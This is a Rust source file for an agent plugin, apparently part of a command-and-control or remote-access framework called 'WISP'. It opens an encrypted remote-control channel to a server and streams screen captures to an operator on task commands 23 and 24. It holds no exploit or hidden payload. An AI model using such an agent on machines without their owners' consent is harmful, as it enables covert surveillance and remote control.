// rcp plugin — CmdRCPConnect / CmdRCPDisconnect (23/24). Opens the long-lived
// Remote Control Protocol channel to the server and streams screen frames
// there, independent of the polling loop. Matches Go agent/commands/rcp.go.

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};
use crate::transport::rcp::RcpClient;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};

pub const CMD_RCP_CONNECT: u32 = 23;
pub const CMD_RCP_DISCONNECT: u32 = 24;

/// Global RCP client shared by command handlers and the injected capture/keys.
pub static RCP: OnceLock<Arc<Mutex<Option<Arc<RcpClient>>>>> = OnceLock::new();

/// Per-session keys and capture function injected by the main loop after the
/// RSA/AES handshake (RCP reuses the checkin session keys).
static RCP_KEYS: OnceLock<Arc<Mutex<Option<crate::protocol::crypto::SessionKeys>>>> =
    OnceLock::new();
static RCP_READY: AtomicBool = AtomicBool::new(false);

/// The hex-encoded agent id, injected by the main loop (needed for the RCP
/// Hello handshake). Mirrors Go RCPClient.AgentID.
static AGENT_ID: OnceLock<String> = OnceLock::new();

pub fn set_agent_id(id: &str) {
    let _ = AGENT_ID.set(id.to_string());
}

fn agent_id() -> Option<String> {
    AGENT_ID.get().cloned()
}

pub fn set_session_keys(keys: crate::protocol::crypto::SessionKeys) {
    RCP_KEYS
        .get_or_init(|| Arc::new(Mutex::new(None)))
        .lock()
        .unwrap()
        .replace(keys);
    RCP_READY.store(true, Ordering::SeqCst);
}

/// RSA public key in use, injected after registration (the transport may have
/// fetched it from the server in CLI mode, so the config value may be empty).
static RSA_KEY: OnceLock<String> = OnceLock::new();

pub fn set_rsa_key(pem: &str) {
    if !pem.is_empty() {
        let _ = RSA_KEY.set(pem.to_string());
    }
}

fn rsa_key() -> Option<String> {
    RSA_KEY.get().cloned()
}

/// Capture provider installed by the host (main loop). When unset, RCP_CONNECT
/// reports an error to the operator (mirrors Go's notifyError path).
static CAPTURE: OnceLock<crate::transport::rcp::CaptureFn> = OnceLock::new();

pub fn install_capture(f: crate::transport::rcp::CaptureFn) {
    let _ = CAPTURE.set(f);
}

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_RCP_CONNECT, exec_rcp_connect)?;
    r.register(CMD_RCP_DISCONNECT, exec_rcp_disconnect)?;
    Ok(())
}

fn capture_from_static() -> Option<crate::transport::rcp::CaptureFn> {
    if CAPTURE.get().is_some() {
        return CAPTURE.get().cloned();
    }
    // Test harness: WISP_RCP_TEST_CAPTURE installs a synthetic JPEG capture so
    // the full RCP channel (handshake/frames/input) can be validated without a
    // real display.
    if std::env::var("WISP_RCP_TEST_CAPTURE").map(|v| v == "1").unwrap_or(false) {
        return Some(Arc::new(|_q| {
            let jpeg = vec![0xFF, 0xD8, 0x0F, 0xE1, 0x00, 0x10, 0xFF, 0xD9];
            Ok((jpeg, 320, 200))
        }));
    }
    None
}

fn exec_rcp_connect(ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let port = v["port"].as_u64().unwrap_or(0) as u16;
    if port == 0 {
        return Some(TaskResult::fail(&task.id, "rcp port is required".into()));
    }
    let proto = v["proto"].as_str().unwrap_or("kcp").to_string();
    if proto != "tcp" && proto != "kcp" {
        return Some(TaskResult::fail(&task.id, format!("unsupported rcp proto {proto}")));
    }

    let keys = RCP_KEYS.get().and_then(|k| k.lock().unwrap().clone());
    let Some(keys) = keys else {
        return Some(TaskResult::fail(&task.id, "rcp session keys not available".into()));
    };
    let Some(capture) = capture_from_static() else {
        return Some(TaskResult::fail(&task.id, "screen capture is not configured on this platform".into()));
    };
    let Some(aid) = agent_id() else {
        return Some(TaskResult::fail(&task.id, "agent id not available".into()));
    };
    let Some(pem) = rsa_key() else {
        return Some(TaskResult::fail(&task.id, "rsa key not available".into()));
    };

    let mut client = RcpClient::new(&ctx.config.server_host, port, &aid, &pem, keys);
    client.capture = Some(capture);
    client.proto = proto.clone();
    match client.connect() {
        Ok(()) => {
            *RCP.get_or_init(|| Arc::new(Mutex::new(None))).lock().unwrap() = Some(Arc::new(client));
            Some(TaskResult::ok(&task.id, format!("remote control connected (port {port}, {proto})")))
        }
        Err(e) => Some(TaskResult::fail(&task.id, format!("cannot start remote control: {e}"))),
    }
}

fn exec_rcp_disconnect(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    if let Some(c) = RCP.get_or_init(|| Arc::new(Mutex::new(None))).lock().unwrap().take() {
        c.close();
        Some(TaskResult::ok(&task.id, "remote control disconnected".into()))
    } else {
        Some(TaskResult::ok(&task.id, "remote control not connected".into()))
    }
}
